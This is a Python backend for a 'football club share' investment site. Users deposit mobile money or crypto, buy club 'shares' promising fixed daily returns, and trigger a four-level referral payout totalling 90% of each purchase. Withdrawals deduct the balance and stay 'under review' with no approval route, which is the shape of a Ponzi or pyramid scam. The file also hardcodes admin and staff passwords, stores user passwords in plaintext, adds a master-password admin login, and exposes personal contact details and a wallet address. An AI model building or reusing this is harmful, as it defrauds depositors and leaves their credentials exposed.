#!/usr/bin/env python3
"""Own Club — Share Market. Stdlib only. Binds immediately for Railway."""
import json, os, hmac, hashlib, base64, time, uuid, re, threading
from datetime import datetime, timezone
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse, parse_qs

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "8080"))
SECRET = os.environ.get("IMATE1_SECRET", "ownclub-secret-2026").encode()
ADMIN_EMAIL = "k_hmed@yahoo.com"
ADMIN_PASS = os.environ.get("ADMIN_PASSWORD", "Madahketa@17")
ADMIN_PHONE = "+256780509960"
MOMO = os.environ.get("MOMO_NUMBER", "0779168109")
TRC20 = os.environ.get("TRC20_WALLET", "TX4so634h6M13YiCrE4cEncLQg4GgyXP7P")

BASE = Path(__file__).resolve().parent
DATA = Path(os.environ.get("DATA_DIR", str(BASE / "data")))
DATA.mkdir(parents=True, exist_ok=True)
USERS_FILE = DATA / "users.json"
WD_FILE = DATA / "withdrawals.json"

TIERS = [
    {"weeks": 1, "price": 35000, "label": "1 week", "daily": 5000},
    {"weeks": 2, "price": 70000, "label": "2 weeks", "daily": 7500},
    {"weeks": 3, "price": 105000, "label": "3 weeks", "daily": 10000},
    {"weeks": 4, "price": 140000, "label": "4 weeks", "daily": 12500},
]

def club(cid, name, league, crest, value):
    return {
        "id": cid, "name": name, "league": league, "photo": crest,
        "marketValue": value, "tiers": TIERS,
    }

CLUBS = [
    club(1, "Manchester City", "Premier League", "https://crests.football-data.org/65.png", "≈ $4.2B"),
    club(2, "Arsenal", "Premier League", "https://crests.football-data.org/57.png", "≈ $2.6B"),
    club(3, "Liverpool", "Premier League", "https://crests.football-data.org/64.png", "≈ $5.4B"),
    club(4, "Chelsea", "Premier League", "https://crests.football-data.org/61.png", "≈ $3.1B"),
    club(5, "Manchester United", "Premier League", "https://crests.football-data.org/66.png", "≈ $6.6B"),
    club(6, "Tottenham Hotspur", "Premier League", "https://crests.football-data.org/73.png", "≈ $2.8B"),
    club(7, "Real Madrid", "La Liga", "https://crests.football-data.org/86.png", "≈ $6.0B"),
    club(8, "FC Barcelona", "La Liga", "https://crests.football-data.org/81.png", "≈ $5.0B"),
    club(9, "Atletico Madrid", "La Liga", "https://crests.football-data.org/78.png", "≈ $1.5B"),
    club(10, "Sevilla", "La Liga", "https://crests.football-data.org/559.png", "≈ $0.40B"),
    club(11, "Villarreal", "La Liga", "https://crests.football-data.org/94.png", "≈ $0.45B"),
    club(12, "Real Sociedad", "La Liga", "https://crests.football-data.org/92.png", "≈ $0.70B"),
    club(13, "Inter Milan", "Serie A", "https://crests.football-data.org/108.png", "≈ $1.5B"),
    club(14, "AC Milan", "Serie A", "https://crests.football-data.org/98.png", "≈ $1.3B"),
    club(15, "Juventus", "Serie A", "https://crests.football-data.org/109.png", "≈ $2.0B"),
    club(16, "Napoli", "Serie A", "https://crests.football-data.org/113.png", "≈ $0.90B"),
    club(17, "Paris Saint-Germain", "Ligue 1", "https://crests.football-data.org/524.png", "≈ $4.2B"),
    club(18, "Olympique Marseille", "Ligue 1", "https://crests.football-data.org/516.png", "≈ $0.45B"),
    club(19, "Bayern Munich", "Bundesliga", "https://crests.football-data.org/5.png", "≈ $5.0B"),
    club(20, "Borussia Dortmund", "Bundesliga", "https://crests.football-data.org/4.png", "≈ $1.9B"),
    club(21, "Al Hilal", "Saudi Pro League", "https://crests.football-data.org/7467.png", "≈ $0.30B"),
    club(22, "Al Nassr", "Saudi Pro League", "https://crests.football-data.org/7468.png", "≈ $0.28B"),
    club(23, "Al Ittihad", "Saudi Pro League", "https://crests.football-data.org/7470.png", "≈ $0.22B"),
    club(24, "Al Ahli", "Saudi Pro League", "https://crests.football-data.org/7472.png", "≈ $0.20B"),
    club(25, "Inter Miami", "MLS", "https://crests.football-data.org/1031.png", "≈ $1.0B"),
    club(26, "LAFC", "MLS", "https://crests.football-data.org/2073.png", "≈ $1.2B"),
    club(27, "LA Galaxy", "MLS", "https://crests.football-data.org/2068.png", "≈ $0.90B"),
    club(28, "New York City FC", "MLS", "https://crests.football-data.org/2074.png", "≈ $0.70B"),
    club(29, "Leicester City", "Championship", "https://crests.football-data.org/338.png", "≈ $0.40B"),
    club(30, "Leeds United", "Championship", "https://crests.football-data.org/341.png", "≈ $0.40B"),
    club(31, "Southampton", "Championship", "https://crests.football-data.org/340.png", "≈ $0.38B"),
    club(32, "Ipswich Town", "Championship", "https://crests.football-data.org/349.png", "≈ $0.25B"),
]
LEAGUES = []
for c in CLUBS:
    if c["league"] not in LEAGUES:
        LEAGUES.append(c["league"])

LOCK = threading.Lock()

def load(path, default):
    try:
        if path.exists():
            return json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        print("[load]", path, e)
    return default

def save(path, data):
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(path)

def get_users():
    with LOCK:
        return load(USERS_FILE, [])

def save_users(users):
    with LOCK:
        save(USERS_FILE, users)

def find_user(**kw):
    users = get_users()
    if kw.get("uid"):
        return next((u for u in users if u.get("id") == kw["uid"]), None)
    if kw.get("email"):
        e = kw["email"].strip().lower()
        return next((u for u in users if (u.get("email") or "").lower() == e), None)
    if kw.get("phone"):
        d = re.sub(r"\D", "", kw["phone"])
        for u in users:
            up = re.sub(r"\D", "", str(u.get("phone") or ""))
            if d and up and (d == up or (len(d) >= 9 and len(up) >= 9 and d[-9:] == up[-9:])):
                return u
    return None

def update_user(user):
    users = get_users()
    for i, u in enumerate(users):
        if u.get("id") == user.get("id"):
            users[i] = user
            save_users(users)
            return
    users.append(user)
    save_users(users)

def hash_password(password):
    salt = os.urandom(16)
    h = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 80_000)
    return base64.b64encode(salt + h).decode()

def verify_password(password, stored):
    try:
        raw = base64.b64decode(stored)
        salt, h = raw[:16], raw[16:]
        return hmac.compare_digest(h, hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 80_000))
    except Exception:
        return False

def make_token(uid, admin=False):
    payload = json.dumps({"uid": uid, "adm": bool(admin), "exp": int(time.time()) + 7 * 86400})
    sig = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(payload.encode()).decode() + "." + sig

def decode_token(token):
    try:
        body, sig = token.split(".", 1)
        payload = base64.urlsafe_b64decode(body.encode() + b"==").decode()
        expect = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expect, sig):
            return None
        data = json.loads(payload)
        if data.get("exp", 0) < time.time():
            return None
        return data
    except Exception:
        return None

def invite_code():
    return "IM" + uuid.uuid4().hex[:6].upper()

def public_user(u):
    return {
        "id": u.get("id"),
        "name": u.get("name"),
        "phone": u.get("phone"),
        "email": u.get("email"),
        "invite_code": u.get("invite_code"),
        "used_invite": u.get("used_invite"),
        "referred_by": u.get("referred_by"),
        "balance": u.get("balance", 0),
        "locked": u.get("locked", 0),
        "shares": u.get("shares", []),
        "deposits": u.get("deposits", [])[-30:],
        "transactions": u.get("transactions", [])[:40],
        "is_admin": bool(u.get("is_admin")),
        "is_support": bool(u.get("is_support")),
        "title": u.get("title") or "",
        "referral_earnings": u.get("referral_earnings", 0),
    }

def seed():
    users = get_users()
    staff = [
        ("admin", "Admin (Owner)", ADMIN_PHONE, ADMIN_EMAIL, ADMIN_PASS, True, False, "IMXT2Y0M8D", "Owner"),
        ("staff_kato", "James Kato", "", "katojamex@gmail.com", "Trade001", False, True, "STAFF0KATO", "Support"),
        ("staff_mugaga", "Mugaga Muto", "+96550051932", "mugagamuto04@gmail.com", "Muto@2026", False, True, "STAFFMUTO", "Co-Manager"),
    ]
    changed = False
    emails = {(u.get("email") or "").lower() for u in users}
    for sid, name, phone, email, pw, adm, sup, code, title in staff:
        if email.lower() in emails:
            continue
        users.append({
            "id": sid, "name": name, "phone": phone, "email": email,
            "password_hash": hash_password(pw), "password": pw,
            "invite_code": code, "balance": 0, "locked": 0,
            "shares": [], "deposits": [], "transactions": [],
            "is_admin": adm, "is_support": sup, "title": title,
            "referral_earnings": 0, "referred_by": None,
        })
        emails.add(email.lower())
        changed = True
        print("[seed]", email)
    if changed:
        save_users(users)

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0] if args else fmt}", flush=True)

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def _json(self, code, data):
        body = json.dumps(data, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _file(self, name, ctype):
        path = BASE / name
        if not path.exists():
            return self._json(404, {"error": "missing " + name})
        data = path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0:
            return {}
        return json.loads(self.rfile.read(n).decode() or "{}")

    def _auth(self):
        h = self.headers.get("Authorization") or ""
        if h.startswith("Bearer "):
            return decode_token(h[7:].strip())
        return None

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ("/api/health", "/health", "/healthz", "/ping"):
            return self._json(200, {"ok": True, "service": "ownclubshares", "port": PORT})
        if path in ("/", "/index.html", "/app"):
            return self._file("index.html", "text/html; charset=utf-8")
        if path in ("/admin", "/admin.html"):
            return self._file("admin.html", "text/html; charset=utf-8")
        if path == "/frontend.html":
            return self._file("index.html", "text/html; charset=utf-8")
        if path == "/api/clubs":
            return self._json(200, {"leagues": LEAGUES, "clubs": CLUBS})
        tok = self._auth()
        if path == "/api/me":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u:
                return self._json(401, {"error": "Account not found"})
            return self._json(200, {"user": public_user(u), "pay": {"momo": MOMO, "trc20": TRC20}})
        if path == "/api/admin/users":
            if not tok:
                return self._json(401, {"error": "Please log in"})
            u = find_user(uid=tok["uid"])
            if not u or not (u.get("is_admin") or u.get("is_support")):
                return self._json(403, {"error": "System only"})
            return self._json(200, {"users": [public_user(x) for x in get_users()]})
        return self._json(404, {"error": "Not found"})

    def do_POST(self):
        path = urlparse(self.path).path
        try:
            body = self._read()
        except Exception:
            return self._json(400, {"error": "Bad JSON"})

        if path == "/api/register":
            name = (body.get("name") or "").strip()
            email = (body.get("email") or "").strip().lower()
            phone = (body.get("phone") or "").strip()
            password = body.get("password") or ""
            if not name or not email or not phone or len(password) < 4:
                return self._json(400, {"error": "Name, phone, email and password required"})
            if "@" not in email:
                return self._json(400, {"error": "Valid email required"})
            if find_user(email=email):
                return self._json(400, {"error": "Email already registered"})
            if find_user(phone=phone):
                return self._json(400, {"error": "Phone already registered"})
            invite = (body.get("ref") or body.get("invite") or "IMXT2Y0M8D").strip().upper()
            ref = next((x for x in get_users() if (x.get("invite_code") or "").upper() == invite), None)
            user = {
                "id": "u_" + uuid.uuid4().hex[:10],
                "name": name, "email": email, "phone": phone,
                "password_hash": hash_password(password), "password": password,
                "invite_code": invite_code(), "used_invite": invite,
                "referred_by": ref["id"] if ref else None,
                "balance": 0, "locked": 0, "shares": [], "deposits": [],
                "transactions": [], "is_admin": False, "is_support": False,
                "referral_earnings": 0,
                "created": datetime.now(timezone.utc).isoformat(),
            }
            update_user(user)
            token = make_token(user["id"], False)
            return self._json(201, {"token": token, "user": public_user(user), "message": "Account created"})

        if path == "/api/login":
            ident = (body.get("identifier") or body.get("email") or body.get("phone") or "").strip()
            password = body.get("password") or ""
            u = find_user(email=ident) or find_user(phone=ident)
            if not u:
                return self._json(401, {"error": "Invalid login"})
            ok = verify_password(password, u.get("password_hash") or "") or (u.get("password") == password)
            if u.get("is_admin") and password == ADMIN_PASS:
                ok = True
            if not ok:
                return self._json(401, {"error": "Invalid login"})
            return self._json(200, {"token": make_token(u["id"], bool(u.get("is_admin"))), "user": public_user(u)})

        tok = self._auth()
        if not tok:
            return self._json(401, {"error": "Please log in"})
        user = find_user(uid=tok["uid"])
        if not user:
            return self._json(401, {"error": "Account not found"})

        if path == "/api/deposit":
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            txid = (body.get("txid") or body.get("txId") or "").strip()
            method = (body.get("method") or "momo").strip().lower()
            if amount < 3000:
                return self._json(400, {"error": "Minimum deposit is UGX 3,000"})
            if not txid:
                return self._json(400, {"error": "Transaction ID required"})
            dep = {
                "id": "d_" + uuid.uuid4().hex[:10],
                "amount": amount, "txid": txid, "method": method,
                "status": "pending",
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            user.setdefault("deposits", []).insert(0, dep)
            user.setdefault("transactions", []).insert(0, {
                "date": dep["created_at"], "type": "Deposit submitted", "amount": amount, "status": "pending"
            })
            update_user(user)
            return self._json(200, {"message": "Deposit submitted. Wallet updates after system confirmation.", "user": public_user(user)})

        if path == "/api/purchase":
            cid = int(body.get("club_id") or body.get("machine_id") or 0)
            weeks = int(body.get("weeks") or 1)
            club = next((c for c in CLUBS if c["id"] == cid), None)
            tier = next((t for t in TIERS if t["weeks"] == weeks), None)
            if not club or not tier:
                return self._json(400, {"error": "Choose a club and lock period"})
            price = tier["price"]
            if float(user.get("balance") or 0) < price:
                return self._json(400, {"error": "Insufficient balance. Deposit first."})
            user["balance"] = round(float(user["balance"]) - price, 2)
            share = {
                "id": "s_" + uuid.uuid4().hex[:8],
                "club_id": club["id"], "club": club["name"], "league": club["league"],
                "weeks": weeks, "price": price, "daily": tier["daily"],
                "start": datetime.now(timezone.utc).isoformat(),
            }
            user.setdefault("shares", []).append(share)
            user["locked"] = round(float(user.get("locked") or 0) + price, 2)
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": f"Bought {club['name']} · {tier['label']}",
                "amount": -price,
            })
            # 4-level referral on investment
            rates = (0.30, 0.25, 0.20, 0.15)
            parent_id = user.get("referred_by")
            buyer = user
            for level, rate in enumerate(rates, 1):
                if not parent_id:
                    break
                parent = find_user(uid=parent_id)
                if not parent:
                    break
                reward = int(round(price * rate))
                parent["balance"] = round(float(parent.get("balance") or 0) + reward, 2)
                parent["referral_earnings"] = round(float(parent.get("referral_earnings") or 0) + reward, 2)
                parent.setdefault("transactions", []).insert(0, {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": f"L{level} referral {int(rate*100)}% — {buyer.get('name')}",
                    "amount": reward,
                })
                update_user(parent)
                parent_id = parent.get("referred_by")
            update_user(user)
            return self._json(200, {"message": "Shares purchased", "user": public_user(user)})

        if path == "/api/withdraw":
            if not user.get("shares"):
                return self._json(400, {"error": "Buy club shares before withdrawing"})
            try:
                amount = float(body.get("amount") or 0)
            except Exception:
                amount = 0
            if amount <= 0 or amount > float(user.get("balance") or 0):
                return self._json(400, {"error": "Invalid amount"})
            fee = round(amount * 0.05, 2)
            user["balance"] = round(float(user["balance"]) - amount, 2)
            wds = load(WD_FILE, [])
            wds.insert(0, {
                "id": "w_" + uuid.uuid4().hex[:10],
                "user_id": user["id"], "name": user.get("name"),
                "amount": amount, "fee": fee, "net": round(amount - fee, 2),
                "status": "under_review",
                "txid": "WD" + uuid.uuid4().hex[:10].upper(),
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            })
            save(WD_FILE, wds)
            user.setdefault("transactions", []).insert(0, {
                "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "Withdrawal request", "amount": -amount,
            })
            update_user(user)
            return self._json(200, {"message": "Withdrawal under review", "user": public_user(user)})

        if path == "/api/admin/deposit-action":
            if not (user.get("is_admin") or user.get("is_support")):
                return self._json(403, {"error": "System only"})
            action = (body.get("action") or "").lower()
            dep_id = body.get("deposit_id")
            target = find_user(uid=body.get("user_id"))
            if not target:
                return self._json(404, {"error": "User not found"})
            dep = next((d for d in target.get("deposits") or [] if d.get("id") == dep_id), None)
            if not dep:
                return self._json(404, {"error": "Deposit not found"})
            if action == "approve":
                if dep.get("status") != "confirmed":
                    amt = float(dep.get("amount") or 0)
                    bonus = 1500 if amt == 3000 else 0
                    target["balance"] = round(float(target.get("balance") or 0) + amt + bonus, 2)
                    dep["status"] = "confirmed"
                    target.setdefault("transactions", []).insert(0, {
                        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "type": "Deposit approved", "amount": amt,
                    })
                    if bonus:
                        target["transactions"].insert(0, {
                            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "type": "Joining bonus", "amount": bonus,
                        })
            elif action == "reject":
                dep["status"] = "rejected"
            else:
                return self._json(400, {"error": "action must be approve or reject"})
            update_user(target)
            return self._json(200, {"ok": True, "user": public_user(target)})

        return self._json(404, {"error": "Not found"})


def main():
    class S(ThreadingHTTPServer):
        allow_reuse_address = True
        daemon_threads = True
    httpd = S((HOST, PORT), Handler)
    print(f"[boot] listening {HOST}:{PORT}", flush=True)
    threading.Thread(target=seed, daemon=True).start()
    httpd.serve_forever()

if __name__ == "__main__":
    main()
